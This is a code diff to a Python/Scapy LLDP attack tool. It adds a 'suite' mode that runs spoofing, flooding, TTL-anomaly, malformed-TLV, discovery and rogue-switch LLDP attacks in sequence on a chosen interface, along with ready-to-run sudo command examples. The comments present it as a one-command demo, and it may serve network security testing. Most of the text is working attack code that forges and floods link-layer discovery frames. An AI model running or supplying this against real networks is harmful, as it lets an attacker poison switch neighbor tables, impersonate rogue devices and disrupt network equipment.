@@ -345,8 +345,13 @@ Attack Modes:
   replay      - Replay LLDP from PCAP file
   discovery   - Broadcast discovery with randomized IDs
   capture     - Passive LLDP capture for reconnaissance
+  suite       - Run all attacks in sequence (ONE COMMAND for full demo!)
 
 Examples:
+  # Run ALL attacks automatically (perfect for demos!)
+  sudo python3 scapy_lldp_attacks.py --mode suite --iface eth0 --rate 50 --duration 60
+
+  # Individual attacks
   sudo python3 scapy_lldp_attacks.py --mode flood --iface eth0 --rate 50 --duration 30
   sudo python3 scapy_lldp_attacks.py --mode spoof --iface eth0 --chassis "fake-sw" --port "eth1"
   sudo python3 scapy_lldp_attacks.py --mode ttl_anomaly --iface eth0 --ttl-anom-val 0
@@ -363,7 +368,7 @@ Advanced:
     parser.add_argument("--out-iface", help="Output interface for two-NIC relay")
     parser.add_argument("--mode", required=True,
                         choices=["spoof", "relay", "flood", "ttl_anomaly", "malformed",
-                                "replay", "discovery", "capture"],
+                                "replay", "discovery", "capture", "suite"],
                         help="Attack mode")
 
     # Rate control
@@ -487,6 +492,89 @@ Advanced:
                                         f"p{random.randint(1,65535)}",
                                         args.ttl, args.system_name, org_tlvs, vlan=args.vlan)
             count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, args.dry_run)
+
+        # SUITE MODE - Run all attacks in sequence
+        elif args.mode == "suite":
+            print(f"[*] LLDP Attack Suite - Running all attacks in sequence\n")
+
+            all_frames = []
+            suite_start = time.time()
+            attack_duration = args.duration / 6  # Divide time among 6 active attacks
+
+            attacks_run = []
+
+            # 1. Spoof Attack
+            print(f"\n{'='*60}\n[1/6] Running Spoof Attack ({attack_duration:.1f}s)\n{'='*60}")
+            chassis_id = args.chassis or "spoofed-switch"
+            port_id = args.port or "eth0"
+            builder = lambda: build_lldp(chassis_id, port_id, args.ttl, args.system_name, org_tlvs, vlan=args.vlan)
+            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
+            all_frames.extend(f)
+            attacks_run.append(f"Spoof: {c} packets")
+
+            # 2. Flood Attack
+            print(f"\n{'='*60}\n[2/6] Running Flood Attack ({attack_duration:.1f}s)\n{'='*60}")
+            chassis_base = args.chassis or "aa:bb:cc:dd:ee"
+            pkt_count = [0]
+            def flood_builder():
+                chassis_id = f"{chassis_base}:{pkt_count[0]%256:02x}"
+                port_id = f"flood_port_{pkt_count[0]}"
+                pkt_count[0] += 1
+                return build_lldp(chassis_id, port_id, args.ttl, vlan=args.vlan)
+            c, f = send_loop(args.iface, flood_builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
+            all_frames.extend(f)
+            attacks_run.append(f"Flood: {c} packets")
+
+            # 3. TTL Anomaly
+            print(f"\n{'='*60}\n[3/6] Running TTL Anomaly Attack ({attack_duration:.1f}s)\n{'='*60}")
+            chassis_id = "ttl-anomaly"
+            port_id = "eth0"
+            builder = lambda: build_lldp(chassis_id, port_id, args.ttl_anom_val, args.system_name, org_tlvs, vlan=args.vlan)
+            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
+            all_frames.extend(f)
+            attacks_run.append(f"TTL Anomaly: {c} packets")
+
+            # 4. Malformed TLV
+            print(f"\n{'='*60}\n[4/6] Running Malformed TLV Attack ({attack_duration:.1f}s)\n{'='*60}")
+            chassis_id = "malformed-switch"
+            port_id = "eth0"
+            builder = lambda: build_lldp(chassis_id, port_id, args.ttl, args.system_name, org_tlvs, malformed=True, vlan=args.vlan)
+            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
+            all_frames.extend(f)
+            attacks_run.append(f"Malformed: {c} packets")
+
+            # 5. Discovery
+            print(f"\n{'='*60}\n[5/6] Running Discovery Attack ({attack_duration:.1f}s)\n{'='*60}")
+            builder = lambda: build_lldp(f"disc-{random.randint(1,9999)}", f"p{random.randint(1,65535)}",
+                                        args.ttl, args.system_name, org_tlvs, vlan=args.vlan)
+            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
+            all_frames.extend(f)
+            attacks_run.append(f"Discovery: {c} packets")
+
+            # 6. Spoof (different variant)
+            print(f"\n{'='*60}\n[6/6] Running Spoof Attack Variant ({attack_duration:.1f}s)\n{'='*60}")
+            chassis_id = "rogue-switch-2"
+            port_id = "GigabitEthernet0/1"
+            builder = lambda: build_lldp(chassis_id, port_id, 65535, "ROGUE_DEVICE", org_tlvs, vlan=args.vlan)  # TTL=65535 for persistence
+            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
+            all_frames.extend(f)
+            attacks_run.append(f"Spoof Variant: {c} packets")
+
+            suite_stop = time.time()
+            count = len(all_frames)
+            frames = all_frames
+
+            print(f"\n{'='*60}")
+            print(f"[+] Attack Suite Completed")
+            print(f"{'='*60}")
+            print(f"    Total Duration: {suite_stop - suite_start:.2f}s")
+            print(f"    Total Packets: {count}")
+            print(f"\n    Attack Breakdown:")
+            for attack in attacks_run:
+                print(f"      - {attack}")
+
+            metadata.parameters = {"mode": "suite", "attacks_run": len(attacks_run), "attack_breakdown": attacks_run}
+            metadata.packets_sent = count
 
         # CAPTURE MODE - From: github.com/GoozeyX/python_lldp
         elif args.mode == "capture":
